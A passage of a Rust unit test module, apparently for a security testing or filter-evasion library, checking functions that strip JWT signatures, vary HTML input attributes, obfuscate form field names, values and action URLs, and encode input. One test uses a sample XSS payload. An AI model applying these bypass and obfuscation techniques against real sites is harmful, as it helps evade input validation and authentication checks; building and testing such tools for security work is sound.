        let result = jwt_signature_bypass(token);
        assert!(result.contains("header") && result.contains("payload"));
    }

    #[test]
    fn test_jwt_signature_bypass_special_chars() {
        let token = "head-er.pay_load.sig+nature/";
        let result = jwt_signature_bypass(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_signature_bypass_base64_padding() {
        let token = "eyJhbGc=.eyJzdWI=.c2lnbmF0dXJl";
        let result = jwt_signature_bypass(token);
        assert!(result.contains("eyJhbGc="));
    }

    #[test]
    fn test_jwt_signature_bypass_multiple_dots() {
        let token = "header.payload.signature.extra";
        let result = jwt_signature_bypass(token);
        // Should handle gracefully
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_signature_bypass_preserves_header() {
        let token = "myheader.mypayload.mysignature";
        let result = jwt_signature_bypass(token);
        assert!(result.contains("myheader"));
    }

    #[test]
    fn test_jwt_signature_bypass_preserves_payload() {
        let token = "header.payload.signature";
        let result = jwt_signature_bypass(token);
        assert!(result.contains("payload"));
    }

    // HTML Input Field Tests
    #[test]
    fn test_html_input_attribute_variation() {
        let input = r#"<input type="text" name="username">"#;
        let result = html_input_attribute_variation(input);
        assert!(!result.is_empty());
        assert!(result.to_lowercase().contains("input"));
    }

    #[test]
    fn test_html_input_attribute_variation_empty() {
        let input = "";
        let result = html_input_attribute_variation(input);
        assert_eq!(result, "");
    }

    #[test]
    fn test_html_input_attribute_variation_autofocus() {
        let input = r#"<input type="text">"#;
        let mut found_autofocus = false;
        for _ in 0..100 {
            let result = html_input_attribute_variation(input);
            if result.contains("autofocus") {
                found_autofocus = true;
                break;
            }
        }
        assert!(found_autofocus);
    }

    #[test]
    fn test_html_input_attribute_variation_autocomplete() {
        let input = r#"<input type="password">"#;
        let mut found_autocomplete = false;
        for _ in 0..50 {
            let result = html_input_attribute_variation(input);
            if result.to_lowercase().contains("autocomplete") {
                found_autocomplete = true;
                assert!(result.to_lowercase().contains("off"));
                break;
            }
        }
        assert!(found_autocomplete);
    }

    #[test]
    fn test_html_input_attribute_variation_hidden() {
        let input = r#"<input type="text">"#;
        let mut found_hidden = false;
        for _ in 0..100 {
            let result = html_input_attribute_variation(input);
            if result.contains("hidden") {
                found_hidden = true;
                break;
            }
        }
        assert!(found_hidden);
    }

    #[test]
    fn test_html_input_attribute_variation_required() {
        let input = r#"<input type="email">"#;
        let mut found_required = false;
        for _ in 0..100 {
            let result = html_input_attribute_variation(input);
            if result.contains("required") {
                found_required = true;
                break;
            }
        }
        assert!(found_required);
    }

    #[test]
    fn test_html_input_attribute_variation_maxlength_bypass() {
        let input = r#"<input type="text" maxlength="10">"#;
        let mut found_bypass = false;
        for _ in 0..50 {
            let result = html_input_attribute_variation(input);
            if result.to_lowercase().contains("data-maxlength") {
                found_bypass = true;
                break;
            }
        }
        assert!(found_bypass);
    }

    #[test]
    fn test_html_input_attribute_variation_preserves_structure() {
        let input = r#"<input type="text" name="user">"#;
        let result = html_input_attribute_variation(input);
        assert!(result.to_lowercase().contains("input"));
    }

    #[test]
    fn test_html_input_attribute_variation_multiple_attributes() {
        let input = r#"<input type="text" name="username" id="user-field" class="form-control">"#;
        let result = html_input_attribute_variation(input);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_attribute_variation_self_closing() {
        let input = r#"<input type="submit" />"#;
        let result = html_input_attribute_variation(input);
        assert!(result.to_lowercase().contains("input"));
    }

    #[test]
    fn test_html_input_attribute_variation_no_input_tag() {
        let input = r#"<div>content</div>"#;
        let result = html_input_attribute_variation(input);
        assert!(result.to_lowercase().contains("div"));
    }

    #[test]
    fn test_html_form_field_obfuscate() {
        let field = "username";
        let result = html_form_field_obfuscate(field);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_form_field_obfuscate_empty() {
        let field = "";
        let result = html_form_field_obfuscate(field);
        // Empty field can have various transformations applied:
        // - "" (case_swap on empty)
        // - "_" or "_" (1 char)
        // - "[]" (2 chars)
        // - "user[]" (6 chars)
        // - "form." (5 chars)
        assert!(result.len() <= 6);
    }

    #[test]
    fn test_html_form_field_obfuscate_array_notation() {
        let field = "email";
        let mut found_array = false;
        for _ in 0..100 {
            let result = html_form_field_obfuscate(field);
            if result.contains("[]") {
                found_array = true;
                assert_eq!(result, "email[]");
                break;
            }
        }
        assert!(found_array);
    }

    #[test]
    fn test_html_form_field_obfuscate_nested_notation() {
        let field = "password";
        let mut found_nested = false;
        for _ in 0..100 {
            let result = html_form_field_obfuscate(field);
            if result.contains("user[") {
                found_nested = true;
                assert_eq!(result, "user[password]");
                break;
            }
        }
        assert!(found_nested);
    }

    #[test]
    fn test_html_form_field_obfuscate_dot_notation() {
        let field = "name";
        let mut found_dot = false;
        for _ in 0..100 {
            let result = html_form_field_obfuscate(field);
            if result.contains("form.") {
                found_dot = true;
                assert_eq!(result, "form.name");
                break;
            }
        }
        assert!(found_dot);
    }

    #[test]
    fn test_html_form_field_obfuscate_underscore_prefix() {
        let field = "token";
        let mut found_underscore = false;
        for _ in 0..100 {
            let result = html_form_field_obfuscate(field);
            if result.starts_with('_') || result.ends_with('_') {
                found_underscore = true;
                assert!(result.contains("token"));
                break;
            }
        }
        assert!(found_underscore);
    }

    #[test]
    fn test_html_form_field_obfuscate_preserves_field() {
        let field = "myfield";
        for _ in 0..10 {
            let result = html_form_field_obfuscate(field);
            assert!(
                result.to_lowercase().contains("myfield")
                    || result.contains("user[")
                    || result.contains("form.")
            );
        }
    }

    #[test]
    fn test_html_form_field_obfuscate_complex_name() {
        let field = "user_email_address";
        let result = html_form_field_obfuscate(field);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_form_field_obfuscate_special_chars() {
        let field = "field-name";
        let result = html_form_field_obfuscate(field);
        assert!(result.contains("field") || result.contains("name") || !result.is_empty());
    }

    #[test]
    fn test_html_form_field_obfuscate_variations() {
        let field = "test";
        let mut variations = std::collections::HashSet::new();
        for _ in 0..50 {
            variations.insert(html_form_field_obfuscate(field));
        }
        assert!(variations.len() > 1);
    }

    #[test]
    fn test_html_input_type_variation() {
        let input_type = "password";
        let result = html_input_type_variation(input_type);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_type_variation_empty() {
        let input_type = "";
        let result = html_input_type_variation(input_type);
        // Empty input may return empty or a random type
        assert!(result.is_empty() || result.len() >= 3); // Shortest type is "tel", "url"
    }

    #[test]
    fn test_html_input_type_variation_valid_types() {
        let valid_types = [
            "text",
            "password",
            "email",
            "number",
            "tel",
            "url",
            "search",
            "hidden",
            "submit",
            "button",
            "file",
            "date",
            "datetime-local",
            "time",
            "week",
            "month",
            "color",
            "range",
        ];
        for _ in 0..50 {
            let result = html_input_type_variation("password");
            // Either it's a valid type or it's a case variation of "password"
            if !result.to_lowercase().contains("password") {
                assert!(valid_types.contains(&result.as_str()));
            }
        }
    }

    #[test]
    fn test_html_input_type_variation_case_swap() {
        let input_type = "password";
        let mut found_case_swap = false;
        for _ in 0..100 {
            let result = html_input_type_variation(input_type);
            if result != input_type && result.to_lowercase() == input_type {
                found_case_swap = true;
                break;
            }
        }
        assert!(found_case_swap);
    }

    #[test]
    fn test_html_input_type_variation_random_type() {
        let input_type = "text";
        let mut found_different = false;
        for _ in 0..100 {
            let result = html_input_type_variation(input_type);
            if result != input_type && result.to_lowercase() != input_type {
                found_different = true;
                break;
            }
        }
        assert!(found_different);
    }

    #[test]
    fn test_html_input_type_variation_all_types() {
        let mut types_found = std::collections::HashSet::new();
        for _ in 0..100 {
            types_found.insert(html_input_type_variation("test"));
        }
        assert!(types_found.len() > 3);
    }

    #[test]
    fn test_html_input_type_variation_email() {
        let result = html_input_type_variation("email");
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_type_variation_number() {
        let result = html_input_type_variation("number");
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_type_variation_file() {
        let result = html_input_type_variation("file");
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_type_variation_hidden() {
        let result = html_input_type_variation("hidden");
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_type_variation_date_types() {
        let mut found_date_type = false;
        for _ in 0..50 {
            let result = html_input_type_variation("text");
            if result == "date"
                || result == "datetime-local"
                || result == "time"
                || result == "week"
                || result == "month"
            {
                found_date_type = true;
                break;
            }
        }
        assert!(found_date_type);
    }

    #[test]
    fn test_html_form_action_variation() {
        let action = "/api/login";
        let result = html_form_action_variation(action);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_form_action_variation_empty() {
        let action = "";
        let result = html_form_action_variation(action);
        // Empty action may stay empty or get query params added
        assert!(result.is_empty() || result.starts_with('?'));
    }

    #[test]
    fn test_html_form_action_variation_query_params() {
        let action = "/api/submit";
        let mut found_query = false;
        for _ in 0..100 {
            let result = html_form_action_variation(action);
            if result.contains('?') {
                found_query = true;
                assert!(result.contains("redirect"));
                break;
            }
        }
        assert!(found_query);
    }

    #[test]
    fn test_html_form_action_variation_existing_query() {
        let action = "/api/submit?id=123";
        let mut found_additional_param = false;
        for _ in 0..100 {
            let result = html_form_action_variation(action);
            if result.contains('&') {
                found_additional_param = true;
                assert!(result.contains("id=123"));
                break;
            }
        }
        assert!(found_additional_param);
    }

    #[test]
    fn test_html_form_action_variation_trailing_slash() {
        let action = "/api/login";
        let mut found_slash_variation = false;
        for _ in 0..100 {
            let result = html_form_action_variation(action);
            if result.ends_with('/') || result == action.trim_end_matches('/') {
                found_slash_variation = true;
                break;
            }
        }
        assert!(found_slash_variation);
    }

    #[test]
    fn test_html_form_action_variation_url_encode() {
        let action = "/api/test path";
        let mut found_encoded = false;
        for _ in 0..100 {
            let result = html_form_action_variation(action);
            if result.contains("%20") || result.contains("+") {
                found_encoded = true;
                break;
            }
        }
        assert!(found_encoded);
    }

    #[test]
    fn test_html_form_action_variation_preserves_path() {
        let action = "/users/profile";
        for _ in 0..10 {
            let result = html_form_action_variation(action);
            assert!(
                result.to_lowercase().contains("users")
                    || result.to_lowercase().contains("profile")
                    || result.contains("%")
            );
        }
    }

    #[test]
    fn test_html_form_action_variation_absolute_url() {
        let action = "https://example.com/login";
        let result = html_form_action_variation(action);
        assert!(
            result.to_lowercase().contains("example")
                || result.to_lowercase().contains("login")
                || result.contains("%")
        );
    }

    #[test]
    fn test_html_form_action_variation_relative_url() {
        let action = "../admin/panel";
        let result = html_form_action_variation(action);
        assert!(
            result.to_lowercase().contains("admin")
                || result.to_lowercase().contains("panel")
                || result.contains("%")
        );
    }

    #[test]
    fn test_html_form_action_variation_root() {
        let action = "/";
        let result = html_form_action_variation(action);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_form_action_variation_multiple() {
        let action = "/test";
        let mut variations = std::collections::HashSet::new();
        for _ in 0..50 {
            variations.insert(html_form_action_variation(action));
        }
        assert!(variations.len() > 1);
    }

    #[test]
    fn test_html_input_value_obfuscate() {
        let value = "user@example.com";
        let result = html_input_value_obfuscate(value);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_value_obfuscate_empty() {
        let value = "";
        let result = html_input_value_obfuscate(value);
        assert_eq!(result, "");
    }

    #[test]
    fn test_html_input_value_obfuscate_html_entity() {
        let value = "test@example.com";
        let mut found_entity = false;
        for _ in 0..100 {
            let result = html_input_value_obfuscate(value);
            if result.contains("&#") {
                found_entity = true;
                assert!(result.contains(";"));
                break;
            }
        }
        assert!(found_entity);
    }

    #[test]
    fn test_html_input_value_obfuscate_url_encode() {
        let value = "hello world";
        let mut found_encoded = false;
        for _ in 0..100 {
            let result = html_input_value_obfuscate(value);
            if result.contains("%20") || result.contains("+") {
                found_encoded = true;
                break;
            }
        }
        assert!(found_encoded);
    }

    #[test]
    fn test_html_input_value_obfuscate_unicode_escape() {
        let value = "test@value";
        let mut found_unicode = false;
        for _ in 0..100 {
            let result = html_input_value_obfuscate(value);
            if result.contains("\\u") {
                found_unicode = true;
                break;
            }
        }
        assert!(found_unicode);
    }

    #[test]
    fn test_html_input_value_obfuscate_quotes() {
        let value = r#"value"with"quotes"#;
        let mut found_single_quotes = false;
        for _ in 0..100 {
            let result = html_input_value_obfuscate(value);
            if result.contains('\'') {
                found_single_quotes = true;
                assert!(!result.contains('"') || result.contains("&#"));
                break;
            }
        }
        assert!(found_single_quotes);
    }

    #[test]
    fn test_html_input_value_obfuscate_special_chars() {
        let value = "<script>alert('XSS')</script>";
        let result = html_input_value_obfuscate(value);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_html_input_value_obfuscate_alphanumeric() {
        let value = "abc123";
        let result = html_input_value_obfuscate(value);
        assert!(result.contains('a') || result.contains('1') || !result.is_empty());
    }

    #[test]
    fn test_html_input_value_obfuscate_email() {
        let value = "test@test.com";
        let result = html_input_value_obfuscate(value);
        assert!(
            result.contains("test")
                || result.contains("com")
                || result.contains("%")
                || result.contains("&#")
        );
    }

    #[test]
    fn test_html_input_value_obfuscate_variations() {
        let value = "test@value";
        let mut variations = std::collections::HashSet::new();
        for _ in 0..50 {
            variations.insert(html_input_value_obfuscate(value));
        }
        assert!(variations.len() > 1);
    }

    #[test]
    fn test_html_input_value_obfuscate_preserves_alphanumeric() {
        let value = "test123";
        for _ in 0..10 {
            let result = html_input_value_obfuscate(value);
            assert!(
                result.contains("test")
                    || result.contains("123")
                    || result.contains("%")
                    || result.contains("&#")
            );
        }
    }
}
